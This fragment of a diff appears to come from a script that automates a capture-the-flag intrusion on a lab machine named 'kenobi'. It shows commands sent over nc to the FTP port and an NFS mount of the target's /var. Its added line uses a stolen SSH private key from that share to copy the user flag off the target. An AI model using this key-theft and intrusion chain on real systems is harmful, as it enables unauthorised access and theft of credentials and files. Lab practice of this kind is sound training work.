@@ -29,5 +29,5 @@ echo "2 - INTRUSION"
 } | nc $target_ip 21
 
 mkdir /mnt/kenobi 2> /dev/null
-mount -t nfs -o nolock $target_ip:/var /mnt/kenobi
-ls -la /mnt/kenobi
+mount -t nfs $target_ip:/var /mnt/kenobi
+scp -i /mnt/kenobi/tmp/id_rsa kenobi@${target_ip}:/home/kenobi/user.txt $result_folder/user.txt
